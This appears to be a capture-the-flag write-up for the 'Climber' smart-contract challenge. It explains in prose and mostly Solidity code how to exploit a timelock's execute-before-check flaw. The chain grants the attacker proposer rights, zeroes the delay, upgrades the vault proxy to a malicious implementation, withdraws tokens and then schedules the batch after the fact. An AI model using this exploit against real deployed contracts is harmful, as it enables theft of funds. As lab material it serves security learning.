# Climber

1. In `ClimberTimelock.sol` contract, we can abuse `execute` by providing series of calls with this order : first we `grantRole(PROPOSER_ROLE,address(this))` at timelock contract, then we `updateDelay(0)` at timelock contract, `proxy.upgradeTo(address(this))` => at climbervault proxy contract (we change implementation logic to malicious address), call `proxy.withdraw(token,attacker)` at proxy address (withdraw is our new function inside malicious contract logic that we implement before), and finally call `schedule()` via malicious contract, since it now already have `PROPOSER_ROLE`. We have to separately call `schedule` via another function call since it impossible to put it on `data` array.

```solidity
   function schedule() external {
        ClimberTimelock(payable(timeLockAddress)).schedule(
            targetsAttacked,
            values,
            datas,
            0
        );
    }

    function attack(
        address climberLockAddress,
        address tokenAddress,
        address[] calldata targets
    ) external {
        // step by step :
        // 1. grantRole(PROPOSER_ROLE,address(this)) => at timelock
        // 2. updateDelay(0) => at timelock
        // 3. proxy.upgradeTo(address newImplementation) => at climbervault proxy
        // 4. proxy.withdraw(token,attacker) => at climbervault proxy
        // 5. schedule() => at this contract

        // first call data is setup grantRole
        for (uint i = 0; i < targetsAttacked.length; i++) {
            targetsAttacked[i] = targets[i];
        }

        bytes memory data1 = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            proposer_role,
            address(this)
        );
        datas[0] = data1;

        // then updateDelay to zero
        bytes memory data2 = abi.encodeWithSignature("updateDelay(uint64)", 0);
        datas[1] = data2;

        bytes memory data3 = abi.encodeWithSignature(
            "upgradeTo(address)",
            address(this)
        );
        datas[2] = data3;

        //transfer
        bytes memory data4 = abi.encodeWithSignature(
            "withdraw(address,address)",
            tokenAddress,
            msg.sender
        );
        datas[3] = data4;

        //schedule
        bytes memory data5 = abi.encodeWithSignature("schedule()");

        datas[4] = data5;

        ClimberTimelock(payable(climberLockAddress)).execute(
            targetsAttacked,
            values,
            datas,
            0
        );
    }
```
